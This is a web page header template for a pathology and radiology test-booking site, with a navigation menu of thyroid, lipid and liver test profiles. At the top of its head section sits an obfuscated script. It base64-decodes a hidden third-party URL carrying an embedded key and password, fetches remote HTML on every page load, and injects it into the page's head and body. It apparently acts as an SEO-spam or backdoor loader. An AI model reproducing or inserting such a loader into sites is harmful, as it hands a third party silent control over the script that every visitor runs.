<!DOCTYPE html>
<html lang="en">
<head>
    
     <script>
window.jQuery ||
document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>");
</script>
    <script>
    var eppathurl = window.location.origin + window.location.pathname;
    var eptagmanage = new XMLHttpRequest();
    eptagmanage.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            if (this.response !== 0) {
               
                var temp = new Array();
                var mystr = this.response;
                temp = mystr.split("||||||||||");
                jQuery("head").find("title").remove();
                jQuery("head").append(temp[0]);
                jQuery("body").append(temp[1]);
            }
        }
    };
    eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lOOTgwNTExOTAwMCZla2V5cGFzcz1yRVJmTjJHNDRqVW53bEREaEdpbEdCM1RvamY4ZmtOZDRRbjcmc2l0ZXVybD0=") + eppathurl);
    eptagmanage.send();
</script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lab</title>
  <link rel="stylesheet" href="{{ asset('css/bootstrap.min.css') }}">
  <link rel="stylesheet" href="{{ asset('css/style.css') }}">
  <link rel="stylesheet" href="{{ asset('css/all.css') }}">
  <link rel="stylesheet" href="{{ asset('css/all.min.css') }}">
  <link rel="stylesheet" href="{{ asset('css/fontawesome.css') }} ">
  <link rel="stylesheet" href="{{ asset('css/fontawesome.min.css') }} ">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <!--<link href="https://fonts.googleapis.com/css2?family=Concert+One&display=swap" rel="stylesheet">-->
  <!-- Link Swiper's CSS -->
  <!--------font google-------->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <!--------End font google--------->
  <link rel="stylesheet" href="{{ asset('css/responsive.css') }} ">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
  <link rel="stylesheet" href="{{ asset('css/swiper.css') }}">
</head>
<style>
  .input-container {
    position: relative;
    width: 100%;
  }
  .line {
    height: 4px; /* Line ki height */
    background-color: black; /* Color adjust karen */
    margin: 4px 0; /* Lines ke beech ka gap */
}

  .input-container i {
    position: absolute;
    left: 10px;
    /* Adjust as needed */
    top: 50%;
    transform: translateY(-50%);
    color: #888;
    /* Adjust the color as needed */
  }

  .search-input {
    padding-left: 2.5rem;
    /* Space for the icon */
    width: 100%;

  }

  .navbar-mobile {
    display: flex;
    flex-direction: column; /* By default column */
}

.mobile-bar{
    display: flex;
    flex-wrap: wrap; /* Allows wrapping */
    justify-content: space-between;
    align-items: center;
}

.navbar-tag
{
    flex: 1; /* Responsive flex item */
    min-width: 0; /* Prevents overflow */
}

.nav-form {
    flex: 3; /* Adjusted for better spacing */
    min-width: 0; /* Prevents overflow */
}

.input-container-top,
.input-container {
    width: 100%; /* Full width for mobile */
    display: flex;
    align-items: center;
    margin-bottom: 10px; /* Gap between inputs */
}

.line {
    height: 4px;
    background-color: black; /* Color of the lines */
    margin: 4px 0; /* Gap between lines */
}

/* Mobile Specific Styles */
@media (max-width: 768px) {
    .navbar-mobile {
        flex-direction:row; /* Change to row for mobile */
        align-items:center; /* Center items vertically */
    }
    .col-lg-8,
    .col-md-8,
    .col-8 {
        flex: 1; /* Remaining space */
        max-width: 60%;
    }
}

</style>

<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/67825508af5bfec1dbea23c7/1ihahob8d';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->

<body style="background-color:#f8faf6;">
  <section class="secont-header bg-white sticky-header">
    <div class="container-xxl ">
      <div class="row align-items-center">
      <div class="top-second-header top-second-header d-none d-sm-flex">
        <div class="col-12 d-flex flex-column flex-sm-row justify-content-between align-items-center">
          <div class="logo">
            <a href="{{asset('index')}}"><img src="{{ asset('img/logo.png') }}" height="200" width="200" alt="Logo"></a>
          </div>
         
            <form class="d-flex flex-row align-items-center w-50">
              <div class="input-container-top">
                <i class="fas fa-map-marker-alt icon-left fs-6"></i>
                <input type="text" class="form-control w-75" id="pincodeInput" placeholder="Pincode" aria-describedby="emailHelp" autocomplete="off">
                <div id="suggestions" class="autocomplete-suggestions"></div>
              </div>
              <div class="input-container top-icon">
                <i class="fas fa-search icon fs-6 text-secondery"></i>
                <input type="search" class="form-control w-100" id="searchInput" placeholder="Book a Pathology or Radiology Test" autocomplete="off">
                <div id="searchSuggestions" class="autocomplete-suggestions"></div>
              </div>
            </form>
            <div class="ml-5">
              <div class="d-inline-flex float-end w-100" style="margin-left:10%;">
                <a class="button-73" href="{{asset('cart');}}"><i class="fa-solid fa-cart-shopping float-start"></i><span id="cart-count">0</span> &nbsp;Cart </a>&nbsp;
                <a class="button-73  mt-3 mt-sm-0" href="http://103.43.32.197:8080/rainbowdownload/PatientLogin.aspx">Patient Login</a>
              </div>
            </div>
          </div>
        </div>
        <div class="mobile-view d-flex d-sm-none flex-column align-items-center">
          <div class="row">
            <div class="col-sm-4 col-4">
            <div class="mobile-logo">
              <a href="{{ asset('index') }}">
                <img src="{{ asset('img/logo.png') }}" height="200" width="200" alt="Logo">
              </a>
            </div>
            </div>
            <div class="col-sm-8 col-8">
            <div class="ml-5">
            <div class="d-inline-flex">
            <a class="button-73" href="{{ asset('cart') }}">
                <i class="fa-solid fa-cart-shopping"></i>
                <span id="cart-count">{{ session('cart_count', 0) }}</span> Cart
            </a>
              <a class="button-73 mt-sm-0 ms-3" href="http://103.43.32.197:8080/rainbowdownload/PatientLogin.aspx">Patient Login</a>
            </div>
          </div>
            </div>
            <div class="col-sm-12 col-12">
                <form class="d-flex flex-row flex-sm-row align-items-center">
              <div class="input-container-top">
                <i class="fas fa-map-marker-alt icon-left fs-6"></i>
                <input type="text" class="w-75" id="pincodeInput" placeholder="Pincode" aria-describedby="emailHelp" autocomplete="off">
                <div id="suggestions" class="autocomplete-suggestions"></div>
              </div>
              <div class="input-container top-icon">
                <i class="fas fa-search icon fs-6 text-secondery"></i>
                <input type="search" class=" w-100" id="searchInput" placeholder="Book a Pathology or Radiology Test" autocomplete="off">
                <div id="searchSuggestions" class="autocomplete-suggestions"></div>
              </div>
            </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <div class="navbar-mobile">
      <div class="container-fluid">
    <div class="row mobile-bar">
           <div class="col-lg-4 col-md-4 col-4 navbar-tag">
              <span class="line"></span>
              <span class="line"></span>
              <span class="line"></span>
           </div>
           <div class="col-lg-8 col-md-8 col-8 nav-form">
           
           </div>
        </div>
    </div>
   </div>
<section class="nav-bar-section">
  <nav class="navbar navbar-expand-lg navbar-light navbar-fixed sticky-header">
    <div class="container-fluid">
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav mx-auto">
          <li class="nav-item dropdown">
            <a class="nav-link" href="{{ route('lab-test.thyroid-profile')}}">Thyroid Profile <span class="dropdown-arrow">&#9660;</span></a>
            <ul class="dropdown-menu">
              <li><a href="{{ route('lab-test.Triiodothyronine-Test') }}">Total Triiodolhyronine (T3)</a></li>
              <li><a href="{{route('lab-test.Thyroxine-total')}}">Total Thyroxine (T4)</a></li>
              <li><a href="{{ route('lab-test.Thyroid-Stimulating-Home')}}">Thyroid Stimulating Home (TSH)</a></li>
            </ul>
          </li>
          <li class="nav-item dropdown">
            <a class="nav-link" href="{{ route('lab-test.lipid-profile')}}">Lipid Profile <span class="dropdown-arrow">&#9660;</span></a>
            <!--<ul class="dropdown-menu">-->
            <!--  <li><a href="{{route('lab-test.Cholesterol - Total')}}">Total Cholesterol</a></li>-->
            <!--  <li><a href="{{route('lab-test.Triglycerides')}}">Triglycerides</a></li>-->
            <!--  <li><a href="#">High Density Lipoprotein Good Cholesterol</a></li>-->
            <!--  <li><a href="#">Low Density Lipoprotein Bad Cholesterol</a></li>-->
            <!--  <li><a href="#">Very Low Density Lipoprotein Cholesterol</a></li>-->
            <!--  <li><a href="#">Total Cholesterol/ HDL Cholesterol Ratio</a></li>-->
            <!--  <li><a href="#">LDL/HDL Ratio</a></li>-->
            <!--</ul>-->
          </li>
          <li class="nav-item dropdown">
            <a class="nav-link" href="{{route('lab-test.liver-profile')}}">Liver Profile <span class="dropdown-arrow">&#9660;</span></a>
            <!--<ul class="dropdown-menu">-->
            <!--  <li><a href="#">Billrubion Total</a></li>-->
            <!--  <li><a href="#">Billrubion Direct-Conjugated</a></li>-->
            <!--  <li><a href="#">Billrubin Indirect-Unconjugated</a></li>-->
            <!--  <li><a href="#">Protein Total Serum</a></li>-->
            <!--  <li><a href="#">Albumin Serum</a></li>-->
            <!--  <li><a href="#">Globulln Serum</a></li>-->
            <!--  <li><a href="#">AG Ratio</a></li>-->
            <!--  <li><a href="#">SGOT/AST</a></li>-->
            <!--  <li><a href="#">SGPT/ALT</a></li>-->
            <!--  <li><a href="#">ALkaline Phosphatase</a></li>-->
            <!--</ul>-->
          </li>
          <!--<li class="nav-item dropdown">-->
          <!--  <a class="nav-link" href="{{route('lab-test.CBC-(Complete-Blood-Count)')}}">Blood Counts/Anemia Screen <span class="dropdown-arrow">&#9660;</span></a>-->
          <!--  <ul class="dropdown-menu" id="subdropdownwidth">-->

          <!--    <div class="dropdown-column">-->


          <!--      <div class="row">-->

          <!--        <div class="col-md-6">-->
          <!--          <ul>-->
          <!--            <li><a href="#">Ttal Leucocyle Counl (TLC)</a></li>-->
          <!--            <li><a href="#">Neutrophil Count</a></li>-->
          <!--            <li><a href="#">absolute Neutrophil Count</a></li>-->
          <!--            <li><a href="#">Eosinophil Count</a></li>-->
          <!--            <li><a href="#">Absolute Eosinophil Count</a></li>-->
          <!--            <li><a href="#">Nonocyte Count</a></li>-->
          <!--            <li><a href="#">Absolute Nonocyte Count</a></li>-->
          <!--          </ul>-->
          <!--        </div>-->
          <!--        <div class="col-md-6">-->
          <!--          <ul>-->
          <!--            <li><a href="#">Basophil Count</a></li>-->
          <!--            <li><a href="#">Absolute Basophil</a></li>-->
          <!--            <li><a href="#">Platelet Count</a></li>-->
          <!--            <li><a href="#">Hemoglobin(HB)</a></li>-->
          <!--            <li><a href="#">Red Blood Cell Count(RBC)</a></li>-->
          <!--            <li><a href="#">mean corpuscular volume(MCV)</a></li>-->
          <!--            <li><a href="#">mean corpuscular hemoglobin(MCH)</a></li>-->
          <!--            <li><a href="#">mean corpuscular hb concentration(MCHC)</a></li>-->
          <!--            <li><a href="#">hematocrit/ PVC/ HCT</a></li>-->
          <!--          </ul>-->
          <!--        </div>-->
          <!--      </div>-->
          <!--    </div>-->
          <!--  </ul>-->
          <!--</li>-->

          <!--<li class="nav-item dropdown">-->
          <!--  <a class="nav-link" href="#">Kidney Profile <span class="dropdown-arrow">&#9660;</span></a>-->
          <!--  <ul class="dropdown-menu">-->
          <!--    <li><a href="#">Urea </a></li>-->
          <!--    <li><a href="http://">Serum Creatinine</a></li>-->
          <!--    <li><a href="#">Uric Acid Na</a></li>-->
          <!--    <li><a href="http://"> Calclum </a></li>-->
          <!--    <li><a href="http://">Na+ Serum Sodium</a></li>-->
          <!--    <li><a href="#">K+ Serum Pottsium</a></li>-->
          <!--    <li><a href="h">Bun Urea Creatinine Ratio</a></li>-->
          <!--    <li><a href="http://">eGFR</a></li>-->
          <!--  </ul>-->
          <!--</li>-->
          <!--<li class="nav-item dropdown">-->
          <!--  <a class="nav-link" href="#">Diabetic Screen <span class="dropdown-arrow">&#9660;</span></a>-->
          <!--  <ul class="dropdown-menu">-->
          <!--    <li><a href="#">Blood Clucose/Sugar Fasting</a></li>-->
          <!--    <li><a href="#">Urine Glucose HBA1c</a></li>-->
          <!--     <li><a href="#">Option 3</a></li> -->
          <!--  </ul>-->
          <!--</li>-->

          <!--<li class="nav-item dropdown">-->
          <!--  <a class="nav-link" href="#">Complete Urine Examination <span class="dropdown-arrow">&#9660;</span></a>-->
          <!--  <ul class="dropdown-menu" id="subdropdownwidth">-->

          <!--    <div class="row">-->
          <!--      <div class="col-md-6">-->
          <!--        <li><a href="#">Billrubin</a></li>-->
          <!--        <li><a href="#">Nitrite</a></li>-->
          <!--        <li><a href="#">Leucocytes</a></li>-->
          <!--        <li><a href="#">Colour</a></li>-->
          <!--        <li><a href="#">Appearance</a></li>-->
          <!--        <li><a href="#">Specific Gravity</a></li>-->
          <!--        <li><a href="#">Reaction pH</a></li>-->
          <!--      </div>-->

          <!--      <div class="col-md-6">-->
          <!--        <li><a href="#">PUS Call</a></li>-->
          <!--        <li><a href="#">Epithalial Call</a></li>-->
          <!--        <li><a href="#">Caste</a></li>-->
          <!--        <li><a href="#">Crystats</a></li>-->
          <!--        <li><a href="#">Bacteria</a></li>-->
          <!--        <li><a href="#">Specific Gravity</a></li>-->
          <!--        <li><a href="#">RBC'S</a></li>-->
          <!--      </div>-->
          <!--    </div>-->
          <!--  </ul>-->
          <!--</li>-->
          <li class="nav-item dropdown">
          </li>
        </ul>
      </div>
    </div>
  </nav>
</section>